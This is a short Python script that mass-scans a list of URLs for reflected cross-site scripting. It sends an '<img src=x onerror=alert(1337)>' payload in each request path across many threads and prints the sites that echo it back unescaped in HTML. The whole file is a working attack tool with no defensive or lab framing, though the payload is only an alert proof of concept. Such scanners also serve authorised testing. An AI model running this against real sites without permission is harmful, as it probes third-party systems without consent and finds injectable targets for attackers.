#!/usr/bin/python3
import sys
import socket
import urllib.parse
import threading
import ssl
import random

debug = False

url_list = []
tlock = threading.Lock()

context = ssl.create_default_context()

payload = urllib.parse.quote_plus("<img src=x onerror=alert(1337)>")
identifier = "<img src=x onerror=alert(1337)>"

def get_full_url(host,port,payload):
 scheme = "http"
 if port == 443 or port == 8443:
  scheme = "https"
 return f"{scheme}://{host}:{port}/{payload}"

def get_host_pair(url):
 if "://" in url:
  scheme = url.split("://")[0]
  if scheme == "http":
   port = 80
  else:
   port = 443
  host = url.split("://")[1]
  if "/" in host: host = host.split("/")[0]
  if ":" in host:
   port = int(host.split(":")[1])
   host = host.split(":")[0]
  return host,port
 else:
  return url,443

def make_request(host,port):
 request = f"GET /{payload} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
 return request

def test_url(url):
 host,port = get_host_pair(url)
 if debug: print("testing {}".format(host))
 tls = False
 if port == 443 or port == 8443:
  tls = True
 s = socket.socket()
 s.settimeout(5)
 s.connect((host,port))
 if tls:
  s = context.wrap_socket(s, server_hostname=host)
 s.send(make_request(host,port).encode())
 response = s.recv(10000).decode()
 if "Content-Type: text/html" in response and identifier in response:
  print(get_full_url(host,port,payload))
  
def _handler():
 global url_list
 while len(url_list):
  try:
   with tlock: url = url_list.pop(0)
   if debug: print(url)
   if "//" in url and url[-1] != "/":
    url += "/"
   test_url(url)
  except Exception as error:
   if debug: print(error)
   
if len(sys.argv) < 2:
 print(f"cat urls.txt | ./{sys.argv[0]} <threads>")
 sys.exit(0)
threadnum = int(sys.argv[1])
for line in sys.stdin:
 url_list.append(line.strip())
random.shuffle(url_list)
for i in range(threadnum):
 t=threading.Thread(target=_handler)
 t.start()
 
